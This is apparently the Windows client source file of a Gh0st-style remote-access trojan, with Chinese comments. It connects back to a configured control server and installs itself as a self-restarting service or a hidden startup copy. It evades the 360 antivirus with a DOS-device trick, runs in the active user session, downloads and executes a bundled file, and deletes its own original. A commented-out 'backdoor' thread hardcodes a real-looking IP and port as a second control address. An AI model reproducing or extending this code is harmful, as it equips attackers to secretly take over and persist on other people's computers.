// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "KernelManager.h"
#include "Login.h"
#include <shellapi.h>
#include "common/KeyboardManager.h"
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"shell32.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "vfw32.lib")

CMyFunc	  m_gFunc;
HMODULE hDllModule = NULL; 
BOOL    bisUnInstall = FALSE;
 
DLL_INFO dll_info = 
{
	"jhjggldccSS",
		4450,
		"",
		"",
		"",
		"",
		"",
		FALSE,
		0,                        //0为共同安装      1为离线记录安装
		'"',            //网络捆绑
};
//
char MyLoginAddr[100];    //上线地址
UINT MyLoginPort;
char MyServiceName[50];//服务名称
char MyServiceDisplayName[50]; //服务显示
char MyServiceDescription[150];  //服务描述
char MyUpGroup[32];       //分组
char MystrRemark[32];     //备注
BOOL MyNoInstall;        // TRUE 绿色安装, FALSE 正常
char ConnetPass[20]; //通信密码  
BOOL MyDele_Kzj;                //离线记录
CHAR MyszDownRun[300];     //捆绑地址
#include <TLHELP32.H>
#include <shellapi.h>





#ifdef _CONSOLE
#include <stdio.h>
int main(int argc, char **argv)
#else
int main(LPVOID p)
#endif
{
#ifdef _CONSOLE
	m_gFunc.LoadMyData();
	if (argc < 3)
	{
		printf("Usage:\n %s <Host> <Port>\n", argv[0]);
		return -1;
	}
#else
	if(!p)
	{
		// 互斥 上线地址:端口:服务名
		char	strMutex[100];
		m_gFunc.wsprintfA(strMutex,"%s:%d:%s",MyLoginAddr,MyLoginPort,MyServiceName);
		HANDLE m_hMutex = m_gFunc.CreateMutex(NULL, FALSE, strMutex);
		if (m_hMutex && m_gFunc.GetLastError() == ERROR_ALREADY_EXISTS)
		{
			m_gFunc.ReleaseMutex(m_hMutex);
			m_gFunc.CloseHandle(m_hMutex);
			return 0;
		}
	}
#endif

    CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			m_gFunc.Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
		char	lpszHost[256]={0};
        UINT  	dwPort = 0;

#ifdef _CONSOLE

		m_gFunc.lstrcat(lpszHost,argv[1]);
		dwPort = atoi(argv[2]);
#else
		if(p)
		{
			char chIP[128]={0},chPort[128]={0},*ip=NULL;
			
			ip=(char*)p;
			if(strstr(ip,":")!=NULL)
			{
				char nip[128]={0},nport[128]={0};
				strncpy(chIP,ip,strcspn(ip,":"));
				ip=ip+strcspn(ip,":")+1;
				strcpy(chPort,ip);
				
				m_gFunc.lstrcat(lpszHost,chIP);
				dwPort = atoi(chPort);
			}
		}
		else
		{
			dwPort = MyLoginPort;
			
			m_gFunc.lstrcat(lpszHost,MyLoginAddr);
		}
#endif
		if(m_gFunc.strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}

		DWORD dwTickCount = m_gFunc.GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}

		DWORD upTickCount = m_gFunc.GetTickCount()-dwTickCount;

#ifdef _CONSOLE
		CKernelManager	manager(&SocketClient,
								lpszHost,
								dwPort, FALSE);
#else
		
		CKernelManager	manager(&SocketClient,
								lpszHost,
								dwPort, p == NULL ? FALSE :TRUE);
#endif

		SocketClient.SetManagerCallBack(&manager);

		if(SendLoginInfo(&SocketClient,upTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}

		DWORD	dwIOCPEvent;
		do
		{
			dwIOCPEvent = m_gFunc.WaitForSingleObject(
				          SocketClient.m_hEvent,
						  100);
			Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);
		
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}

	}
	return 0;
	
}
#ifdef _CONSOLE




#else
// 写注册表 分组 备注 安装时间 信息
void SetRegInfo()
{
	char strSubKey[MAX_PATH];
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", MyServiceName);
	
	if (strlen(MystrRemark))
		WriteRegEx(HKEY_LOCAL_MACHINE, 
		strSubKey, 
		"Remark", 
		REG_SZ, 
		MystrRemark, 
		m_gFunc.strlen(MystrRemark),
		1
		);		
	WriteRegEx(HKEY_LOCAL_MACHINE,
		strSubKey,
		"Group", 
		REG_SZ,
		MyUpGroup, 
		m_gFunc.strlen(MyUpGroup),
		1);	
	char szCurrentDateTime[32];     
	SYSTEMTIME systm;     
	GetLocalTime(&systm);     
	m_gFunc.wsprintf(szCurrentDateTime, "%4d-%.2d-%.2d %.2d:%.2d",     
        systm.wYear, systm.wMonth, systm.wDay,     
        systm.wHour, systm.wMinute);
	
	WriteRegEx(HKEY_LOCAL_MACHINE, 
		strSubKey,
		"InstallTime", 
		REG_SZ,
		szCurrentDateTime, 
		m_gFunc.strlen(szCurrentDateTime), 
		1);
}

extern void DeleteSelf();
DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, FALSE, NULL);
	m_gFunc.WaitForSingleObject(hThread, INFINITE);
	m_gFunc.CloseHandle(hThread);


	return 1;
}
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	// 发生异常，重新创建进程
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
////后门
//DWORD __stdcall MainThread1()
//{	
//
//	char strAddr[128] = "139.9.56.87:8001";//////后门的地址，我不知道你有没有接触过单exe的成品，没有写生成器的那种，那样子的话直接说吧上线地址写道源码里面，就是这个
//	CloseHandle(MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, strAddr, 0, NULL));///mian是上线令牌tonken//这里是首先关闭这个线程的句柄
//	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);//////然后调用线程启动main
//	WaitForSingleObject(hThread, INFINITE);///等待线程完毕
//	CloseHandle(hThread);//关闭句柄
//	return 1;////返回操作
//}
#include <SHELLAPI.H>
int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
	
}

HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;
	
	HINSTANCE userenv = LoadLibrary("userenv.dll"); 
	typedef DWORD (WINAPI *CEB)(LPVOID *lpEnvironment,HANDLE hToken,BOOL bInherit);
	CEB  myCreateEnvironmentBlock= (CEB  )GetProcAddress(userenv,"CreateEnvironmentBlock");
	
	
	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	
	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";
	
	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken,  0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	typedef DWORD (WINAPI *TWTSGetActiveConsoleSessionId)(void);
	
	TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
	MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId  )GetProcAddress(LoadLibrary("Kernel32.dll"),"WTSGetActiveConsoleSessionId");
	
	if ( MyWTSGetActiveConsoleSessionId )
	{
		TokenInformation = MyWTSGetActiveConsoleSessionId();
		
		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//WTSQueryUserToken(TokenInformation,&hObject);
		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}
	
	if(userenv)
		FreeLibrary(userenv);
	
	return result;
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
    hServiceStatus = RegisterServiceCtrlHandler(MyServiceName, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
	OSVERSIONINFO OSversion;	
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
    {
        if (OSversion.dwMajorVersion < 6)
		{
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread(), NULL, 0, NULL);
			do
			{
				Sleep(100);

			}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
		else
		{
			TCHAR MyName[MAX_PATH];
			HANDLE hActiveSession;
			DWORD ExitCode = 0; 
			GetModuleFileName(NULL,MyName,sizeof(MyName));//获取当前文件路径
			char CommandLine[1024];
			wsprintfA(CommandLine,"%s Win7",MyName);
			hActiveSession = RunInActiveSession(CommandLine);
			CloseHandle(hActiveSession);
			
			
		}
    }
	do
	{
		Sleep(100);
	}while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED && bisUnInstall == FALSE);
	//这里不加会一直运行程序
}

//安装服务
BOOL NtInstallService(LPCTSTR strServiceName, //服务名称
					  LPCTSTR strDisplayName, //服务显示名称
					  LPCTSTR strDescription, //服务描述
					  LPCTSTR strPathName,    //可执行文件的路径
					  LPCTSTR Dependencies,   //指定启动该服务前必须先启动的服务或服务组,一般为NULL
					  BOOLEAN KernelDriver,   //是否安装驱动程序
					  ULONG   StartType       //启动类型
					  )
{
    BOOL bRet = FALSE;
    SC_HANDLE svc=NULL, scm=NULL;
    __try
    {
        scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
		{
            return -1;
        }
		svc = CreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);
		
		
		
		SERVICE_FAILURE_ACTIONS sdBuf={0};
		ChangeServiceConfig2(svc, SERVICE_CONFIG_DESCRIPTION, &sdBuf);
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=NULL;
		
		SC_ACTION action[3];
		action[0].Delay=5000;
		action[0].Type=SC_ACTION_RESTART;
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		ChangeServiceConfig2(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf);
		
		// 		SERVICE_DESCRIPTION Service_Descrip={&strDisplayName};
		ChangeServiceConfig2(svc,SERVICE_CONFIG_DESCRIPTION,&sdBuf);
		
		if (svc == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = OpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    StartService(svc,0, 0);
            }
        }
		if (!StartService(svc,0, 0))
            __leave;
		
		char str[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
        TCHAR Desc[MAX_PATH];
        wsprintfA(Desc,str, strServiceName);
		
		WriteRegEx(HKEY_LOCAL_MACHINE, 
			Desc, 
			"Description", 
			REG_SZ, 
			(char*)strDescription, 
			lstrlen(strDescription), 
			0);			
		
        bRet = TRUE;
    }
    __finally
    {
        if (svc!=NULL)
            CloseServiceHandle(svc);
        if (scm!=NULL)
            CloseServiceHandle(scm);
    }
	DeleteSelf();
    return bRet;
}

int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
}

DWORD WINAPI Loop_DownManager1(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	char szFile[512] = {0};
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
			return false; //文件下载成功，但是文件不存在，很可能被杀毒软件查杀
    }else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
		return false;    //URL 不正确，文件下载失败	
	else
		return false; //文件下载失败，请检查URL是否正确
	
	OpenFile1(szFile,SW_SHOW);
	
	
	
	return true;
}
//////////////////////////注册表启动//////////////////////////
typedef UINT
(WINAPI
*GetSystemDirectoryAT)(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );

typedef UINT
(WINAPI
 *GetSystemDirectoryAT)(
 __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
 __in UINT uSize
 );
typedef DWORD
(WINAPI
 *GetFileAttributesAT)(
 __in LPCSTR lpFileName
 );
typedef DWORD (WINAPI *GetModuleFileNameAT)
(
 __in_opt HMODULE hModule,
 __out_ecount_part(nSize, return + 1) LPCH lpFilename,
 __in     DWORD nSize
 );
typedef BOOL
(WINAPI
 *DefineDosDeviceAT)(
 __in     DWORD dwFlags,
 __in     LPCSTR lpDeviceName,
 __in_opt LPCSTR lpTargetPath
 );
typedef BOOL
(WINAPI
 *MoveFileExAT)(
 __in LPCSTR lpExistingFileName,
 __in LPCSTR lpNewFileName,
 __in DWORD dwFlags
 );
typedef BOOL
(WINAPI
 *SetFileAttributesAT)(
 __in LPCSTR lpFileName,
 __in DWORD dwFileAttributes
 );
typedef BOOL
(WINAPI
 *CreateDirectoryAT)(
 __in     LPCSTR lpPathName,
 __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes
 );
typedef int
(WINAPIV
 *wsprintfAT)(
 __out LPSTR,
 __in __format_string LPCSTR,
 ...);
////////////启动项
#include <stdio.h>
#include <shlobj.h>

#pragma   comment(lib,   "shell32.lib")
DWORD WINAPI CreateAutoRun()
{
	GetModuleFileNameAT pGetModuleFileNameA = (GetModuleFileNameAT)GetProcAddress(LoadLibrary("kernel32.DLL"),"GetModuleFileNameA");
	DefineDosDeviceAT pDefineDosDeviceA=(DefineDosDeviceAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DefineDosDeviceA");
    MoveFileExAT pMoveFileExA=(MoveFileExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"MoveFileExA");
	SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetFileAttributesA");
	CreateDirectoryAT pCreateDirectoryA=(CreateDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateDirectoryA");
	char strwsprintfA[] = {'w','s','p','r','i','n','t','f','A','\0'};
	wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),strwsprintfA);
	GetFileAttributesAT pGetFileAttributesA=(GetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetFileAttributesA");
	
	// 	char mQiJA[] = {'3','6','0','t','r','a','y','.','e','x','e','\0'};
	// 
	//  	if (GetProcessID(mQiJA))
	//  	{
	//  		return 0;
	//     }
	
	char x7[100];
    SHGetSpecialFolderPath(NULL,x7,24,false);
	char *x5= new char[1024*1024];
	
    pwsprintfA(x5,"%s�",x7);//加个空格
	
	//MessageBox(NULL,x5,"",NULL);
	char *x6= new char[1024*1024];
	char path[MAX_PATH];
	pGetModuleFileNameA(NULL,path,MAX_PATH);//获取自身路径
	char*p=NULL; 
    p=strrchr(path,'\\');
    p+=1;
	//去重复
	char *x8= new char[1024*1024];
    pwsprintfA(x8,"%s\\%s",x7,p);
	
	if (pGetFileAttributesA(x8)==-1)
	{
        pwsprintfA(x6,"\\??\\%s\\%s",x7,p);//Office Source Engine.exe 设置目标路径
	}
	else
	{
        pwsprintfA(x6,"\\??\\%s\\%c%c%s",x7,'a'+rand()%25,'a'+rand()%25,p);
	}
	// 	char chSvcName[128]={0},chSvcnName[128]={0},chHelpName[128]={0};
	// 	wsprintf(chSvcName,"National%c%c%c",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
	
	//去重复
	
	char mdx[]={'f','u','c','k','3','6','0','\0'};
    pDefineDosDeviceA(1,mdx,x6); // 设置虚拟磁盘
	Sleep(100);
	char kill[50]={'\\','\\','.','\\','f','u','c','k','3','6','0','\0'};
	//	char kill[50]="\\\\.\\killmdx";
    pMoveFileExA(path,kill,MOVEFILE_REPLACE_EXISTING);//文件复制
    pSetFileAttributesA(x7,FILE_ATTRIBUTE_HIDDEN);//设置隐藏属性
    pCreateDirectoryA(x5,NULL);
    delete x5;
	delete x6;
//	MainThread1();
	MainThread();
	return 0;
}

extern "C" __declspec(dllexport) LPVOID Shellex(DLL_INFO m_Install)
{   
	int nInStallSizeof=sizeof(DLL_INFO)+1;
	DLL_INFO *pNewInStall=(DLL_INFO *)new  char[nInStallSizeof];
	memcpy(pNewInStall,&m_Install,nInStallSizeof);
	lstrcpy(MyLoginAddr,pNewInStall->LoginAddr);
	lstrcpy(MyUpGroup,pNewInStall->UpGroup);
	lstrcpy(MystrRemark,pNewInStall->strRemark);
	lstrcpy(MyServiceName,pNewInStall->ServiceName);
	lstrcpy(MyServiceDisplayName,pNewInStall->ServiceDisplayName);
	lstrcpy(MyServiceDescription,pNewInStall->ServiceDescription);
    MyLoginPort=pNewInStall->LoginPort;
	MyNoInstall=pNewInStall->NoInstall;
	MyDele_Kzj=pNewInStall->Dele_Kzj;
	lstrcpy(ConnetPass,pNewInStall->ConnetPass);
	lstrcpy(MyszDownRun,pNewInStall->szDownRun);
	m_gFunc.LoadMyData();
		HANDLE m_hMutex;
	if (MyszDownRun != NULL)
	{
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager1,
			(LPVOID)MyszDownRun, 0, NULL, true);
	}
	//==============================================
	CClientSocket SocketClient;
	if (dll_info.Dele_Kzj != false)
	{
		CKernelManager	manager(&SocketClient);
		manager.StartUnLineHook();
	}
	   
	if (CKeyboardManager::g_hInstances!=NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);
	}	
	//==============================================
	char *p = strstr(GetCommandLine(),"Win7");
	if (p!=NULL)
	{		
//		MainThread1();
		MainThread();	
	}	
	if (MyNoInstall)
	{
//		MainThread1();
		MainThread();
     	SetRegInfo();
	}
	else
	{
		
		if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
		{
			exit(0);
			ExitProcess(0);
			return 0;
		}
		
		SERVICE_TABLE_ENTRY serviceTable[] = { {MyServiceName,(LPSERVICE_MAIN_FUNCTION) ServiceMain}, {NULL,NULL} };//如果已经存在直接启动服务
		
		if (!StartServiceCtrlDispatcher(serviceTable))
		{	
			
			char FilePath[MAX_PATH];
			GetModuleFileName(NULL,FilePath,MAX_PATH);//获取完整路径
			char SystemPath[MAX_PATH];
			GetWindowsDirectory(SystemPath,MAX_PATH);//获取Windows目录的完整路径名
			if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
			{
				char FileName[80];
				wsprintf(FileName,"%c%c%c%c%c%c.exe",'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26));
				strcat(SystemPath,"\\");
				strcat(SystemPath,FileName);
				CopyFile(FilePath,SystemPath,FALSE);
				memset(FilePath,0,MAX_PATH);
				strcpy(FilePath,SystemPath);
			}
			
			BOOL szBool = NtInstallService(MyServiceName,MyServiceDisplayName,MyServiceDescription,FilePath,NULL,false,SERVICE_AUTO_START);//安装服务
			if (!szBool)//安装失败直接上线
			{
//				MainThread1();
				MainThread();		
			}
			SetRegInfo();
			DeleteSelf();
		}
	}
	return 0;
}

#endif
